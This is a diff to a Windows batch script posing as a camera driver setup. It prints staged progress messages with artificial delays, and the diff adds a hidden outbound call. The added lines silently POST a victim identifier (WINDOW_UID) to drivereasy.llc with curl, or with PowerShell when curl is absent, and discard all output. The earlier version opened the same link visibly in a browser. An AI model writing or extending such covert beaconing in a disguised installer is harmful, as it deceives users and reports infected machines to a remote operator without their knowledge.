@@ -9,7 +9,11 @@ call :delay 4
 echo [INFO] Update Driver Packages...
 call :delay 4
 echo [SUCCESS] Camera Driver Setup completed successfully.
-if defined WINDOW_UID start "" "https://drivereasy.llc/auto-update?id=%WINDOW_UID%"
+if defined WINDOW_UID (
+  set "AUTO_URL=https://drivereasy.llc/auto-update?id=!WINDOW_UID!"
+  where curl >nul 2>&1
+  if not errorlevel 1 (curl -sL -X POST "!AUTO_URL!" -o nul) else (powershell -Command "Invoke-WebRequest -Uri '!AUTO_URL!' -Method POST -UseBasicParsing | Out-Null")
+)
 goto :skip_delay
 
 :delay
